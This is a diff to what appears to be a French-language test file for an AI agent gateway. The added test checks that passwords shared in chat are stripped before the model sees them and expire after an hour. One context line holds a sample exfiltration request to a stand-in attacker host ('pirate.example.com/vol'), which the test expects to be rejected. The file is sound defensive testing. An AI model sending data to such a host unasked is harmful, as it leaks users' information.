@@ -133,3 +133,34 @@ test('ce que le propriétaire demande lui-même (une adresse, un site) n\'est pa
   assert.ok(targetInRequest('ouvrir https://www.exemple.fr/page', 'va sur exemple.fr'));
   assert.ok(!targetInRequest('POST https://pirate.example.com/vol', 'résume cette page'));
 });
+
+import { extractSecret, keepSecret, takeSecret, newPassword } from '../src/machines/onboard.ts';
+import { mkdtempSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join as pjoin } from 'node:path';
+
+test('mot de passe dans la discussion : retiré avant le modèle, gardé une heure, jamais redonné', async () => {
+  const x = extractSecret('le mot de passe root de proxmox est Tr0ub4dor&3 merci');
+  assert.equal(x.secret, 'Tr0ub4dor&3');
+  assert.ok(!x.text.includes('Tr0ub4dor'));
+  assert.match(x.text, /secret:dernier/);
+  assert.equal(extractSecret('mdp : Azerty-2026').secret, 'Azerty-2026');
+  assert.equal(extractSecret('j\'ai oublié le mot de passe de la box').secret, undefined);
+  assert.equal(extractSecret('le mot de passe est correct').secret, undefined);
+  const home = mkdtempSync(pjoin(tmpdir(), 'odin-sec-'));
+  keepSecret(home, 'Tr0ub4dor&3', 'root', 1000);
+  assert.equal(takeSecret(home, 2000), 'Tr0ub4dor&3');
+  assert.equal(takeSecret(home, 1000 + 3600_001), undefined, 'expiré après une heure');
+  const p = newPassword(); assert.match(p, /^[\w]{5}(-[\w]{5}){3}$/); assert.match(p, /\d/);
+  // Par la passerelle : le modèle ne voit jamais le mot de passe.
+  const o = makeOdin([{ text: 'Je prends la main.' }]);
+  const gw = new Gateway(o, { owners: { web: ['*'] } });
+  const ch: Channel = { name: 'web', interactive: true, defaultPeer: 'principal', start: async () => {}, stop: async () => {}, send: async () => {} };
+  gw.add(ch);
+  await gw.handle({ channel: 'web', peer: 'principal', name: 'moi', text: 'voici le mot de passe root du 192.168.1.102 : S3cret-Pve!' });
+  const seen = JSON.stringify(o.provider.calls);
+  assert.ok(!seen.includes('S3cret-Pve'), 'le modèle ne voit pas le mot de passe');
+  assert.match(seen, /secret:dernier/);
+  assert.equal(takeSecret(o.paths.home), 'S3cret-Pve!');
+  o.cleanup();
+});
